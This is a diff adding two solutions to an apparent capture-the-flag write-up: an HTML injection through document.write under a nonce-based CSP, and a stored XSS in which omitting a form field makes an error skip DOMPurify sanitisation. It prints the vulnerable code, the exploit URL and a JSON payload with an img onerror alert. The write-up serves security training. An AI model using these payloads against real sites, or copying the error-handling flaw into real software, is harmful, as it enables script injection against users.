@@ -480,7 +480,7 @@ Also you can just send the payload from burp to bypass the client side validatio
 
 **Code:**
 
-```
+```javascript
 // api/users.js
 import clientPromise from "../../lib/mongodb";
 
@@ -1863,6 +1863,316 @@ POST /getCompanyLogo
 
 
 <br /><br />
+
+### **#25: Contact Support**
+
+**Goal: **change the message to 'Hello Dave, our support phone number is: +91-56565-91919'
+
+**Code:**
+
+```javascript
+// code file: index.js
+const helmet = require('helmet');
+const crypto = require('crypto');
+const express = require('express');
+require('dotenv').config();
+const app = express();
+app.set('view engine', 'ejs');
+const ejs = require('ejs');
+const template = require('./main');
+
+app.use((req, res, next) => {
+    let nonce = crypto.randomBytes(16).toString('hex');
+    res.locals.cspNonce = nonce; 
+    next();
+});
+
+app.use(helmet({
+    xFrameOptions: { action: 'deny' },
+    contentSecurityPolicy: {
+        directives: {
+            'script-src': ["'self'", (req, res) => `'nonce-${res.locals.cspNonce}'`]
+        },
+    },
+}));
+
+app.get('/main', async (req, res) => {
+    try {
+        res.send(ejs.render(template, {nonce: res.locals.cspNonce, name: req.query.name, phone: process.env.PHONE}));
+    } catch (e) {
+        console.error(e);
+    }
+})
+
+app.listen(80, () => {
+    console.log('Server is running on port 80');
+});
+
+// code file: main.js
+const template = `<html>
+    <head>
+        <title>Help Center Support</title>
+    </head>
+    <body>
+        <h2 id="title">Hello 
+            <script nonce="<%=nonce%>">
+                document.write((new URLSearchParams(window.location.search).get('name') || 'anonymous'));
+            </script>, our support phone number is: <span id="phone"></div>
+        </h2>
+        <script nonce="<%=nonce%>">
+            document.getElementById('phone').innerHTML = `<span id="phone"><%=phone%></span>`;
+        </script>
+
+        <script nonce="<%=nonce%>">
+            alert(document.getElementById('title').innerText);
+        </script>
+    </body>
+</html>`
+
+module.exports = template;
+```
+
+<br />
+
+```
+https://chal25-dcui84d.vercel.app/main?name=Dave, our support phone number is: +91-56565-91919<h1>test</h1>
+```
+
+Note: you have to url encode it
+
+
+
+<br />
+
+<br />
+
+### **#26: Messages App Level 2**
+
+**Goal: **Inject an alert("Wizer"). 
+
+**Code:**
+
+```javascript
+// views/addMessage.js
+import $ from 'jquery';
+import cx from 'classnames';
+import styles from '../../styles/Inner.module.css'
+
+export default function Home() {
+  const submit = () => {
+    var formData = JSON.stringify($(document.forms[0]).serializeArray());
+    console.log('form data',formData);
+    const response = $.ajax({type: "POST", url: "../api/addMessage", async: false,
+                             data: formData, success: function(){}, dataType: "json",
+                             contentType : "application/json"})
+    if(response.status === 200) { alert(`Successfully added message id:${response.responseText}!`);} 
+    else { console.log(response); $("#error").text(decodeURIComponent(response.responseText));}
+  }
+
+  return (
+      <main className={cx(styles["form-message"],"text-center","mt-5")}>
+        <form id="f1" method="POST">
+          <h1 className="h3 mb-3 fw-normal">Insert message form</h1>
+          <div className={styles["error"]} id="error"></div>
+          <div className="form-floating">
+            <input type="text" name="firstName" className="form-control" id="floatingFirst" placeholder="First name"/>
+            <label htmlFor="floatingFirst">First name </label>
+          </div>
+          <div className="form-floating">
+            <input type="text" name="lastName" className="form-control" id="floatingLast" placeholder="Last name"/>
+            <label htmlFor="floatingLast">Last name &nbsp;</label>
+          </div>
+          <div className="form-floating">
+            <textarea name="message" className="form-control" id="floatingMessage" placeholder="Message"/>
+            <label htmlFor="floatingMessage" style={{verticalAlign: 'top'}}>Message &nbsp;&nbsp;&nbsp;</label>
+          </div>
+          <div className="form-floating">
+            <input type="text" name="attn" className="form-control" id="floatingLast" placeholder="Attention"/>
+            <label htmlFor="floatingLast">Attention &nbsp;</label>
+          </div>
+          <button className="w-100 btn btn-lg btn-primary" type="button" onClick={submit}>Save</button>
+        </form>
+      </main>
+  )
+}
+
+// views/showMessage.js
+import { useRouter } from 'next/router';
+import React from 'react';
+
+export default function Home() {
+    const router = useRouter();
+    const { messageId } = router.query;
+    const hasMessage = typeof messageId === 'string' && messageId.length > 0; 
+    const getMessage = () => {
+        fetch("../api/getMessages", { method: "POST", body: JSON.stringify({ "messageIds": [messageId] }),
+                                      headers: { "content-type": "application/json",}})
+        .then(response => response.json())
+        .then(json => { 
+            document.getElementById("messageId").innerText = json[0].messageId; 
+            document.getElementById("firstName").innerText = json[0].firstName;
+            document.getElementById("lastName").innerText = json[0].lastName; 
+            document.getElementById("message").innerHTML = json[0].message;
+        })
+        .catch((e) => console.log("client:", e));
+    };
+
+    React.useEffect(() => {
+      if (router.isReady && hasMessage) { getMessage(); }
+    }, [router.isReady, hasMessage]);
+
+  return (
+      <main>
+        <h3 id="messageId"></h3>
+        <h3 id="firstName"></h3>
+        <h3 id="lastName"></h3>
+        <h3 id="message"></h3>
+      </main>
+  )
+}
+
+// api/addMessage.js
+import clientPromise from "../../lib/mongodb";
+import DOMPurify from "isomorphic-dompurify";
+
+export default async (req, res) => {
+    try {
+        if(typeof(req.body) === 'object') {
+            const client = await clientPromise;
+            let message = "";
+            let firstName = "";
+            let lastName = "";
+            let attn = "";
+            try { 
+                firstName = req.body[0].value;
+                lastName = req.body[1].value;
+                message = req.body[2].value;
+                attn = req.body[3].value;
+                message = DOMPurify.sanitize(message);;
+            } catch(e) {
+                console.error(e);
+            }
+            const crypto = require("crypto");
+            const newMessageId = crypto.randomBytes(16).toString("hex");
+            await client.db("chal10").collection("messages").insertOne({ 
+                "messageId": newMessageId,
+                "firstName": firstName, 
+                "lastName": lastName, 
+                "message": message,
+                "attention": attn,
+                "date": new Date().toDateString()
+            });
+            res.send(newMessageId);
+        } else {
+            res.send("Invalid arguments provided");
+        }
+    } catch (e) {
+        res.status(500).end(e.message);
+        console.error(e);
+    }
+};
+
+// api/getMessages.js
+import clientPromise from "../../lib/mongodb";
+
+export default async (req, res) => {
+    try {
+        if(typeof(req.body) === 'object') {
+            const messageIds = req.body.messageIds;
+            const client = await clientPromise;
+            const db = client.db("chal10");
+            const message = await db
+                .collection("messages")
+                .find({ messageId: { $in: messageIds }}) 
+                .maxTimeMS(5000)
+                .toArray();
+            res.send(message);
+        } else {
+            res.send("Invalid arguments provided");
+        }
+    } catch (e) {
+        res.status(500).end(e.message);
+        console.error(e);
+    }
+};
+```
+
+he flaw of the change is within the error handling structure below, which can be exploited to change the flow of the code and affect the results. The other effective way to solve it would have been to encode the output, and prevent the XSS from being triggered upon /showMessage.
+
+<br />
+
+By not providing a 4th argument (causing `req.body[3]` to be null), an error will be caused and the error handling structure in place, which is currently merely printing the error message but not exiting the function, will allow the attacker to continue the code flow, skipping the DOMPurify sanitization and injecting a script tag into the message. Then once that message is saved in the system
+
+<br />
+
+
+
+<br />
+
+```
+POST /api/addMessage
+
+[
+  {
+    "name": "firstName",
+    "value": "karim"
+  },
+  {
+    "name": "lastName",
+    "value": "test"
+  },
+  {
+    "name": "message",
+    "value": "<h1>test</h1><img src=x onerror=alert('Wizer')>"
+  }
+]
+```
+
+response: 1bfa3aa0138c8ea534bd2399d3fe2d58
+
+then
+
+```
+https://chal26-j89j45fg8.vercel.app/views/showMessage?messageId=1bfa3aa0138c8ea534bd2399d3fe2d58
+```
+
+<br />
+
+```
+POST /api/getMessages
+
+{
+  "messageIds": [
+    "3552179e163ba31aff100fefb36b5a61"
+  ]
+}
+```
+
+<br />
+
+response:
+
+```
+[
+  {
+    "_id": "68968d67e450b4442063d3b9",
+    "messageId": "3552179e163ba31aff100fefb36b5a61",
+    "firstName": "karim",
+    "lastName": "test",
+    "message": "<h1>test</h1><img src=x onerror=alert('Wizer')",
+    "attention": "",
+    "date": "Fri Aug 08 2025"
+  }
+]
+```
+
+<br />
+
+
+
+<br />
+
+<br />
 
 
 
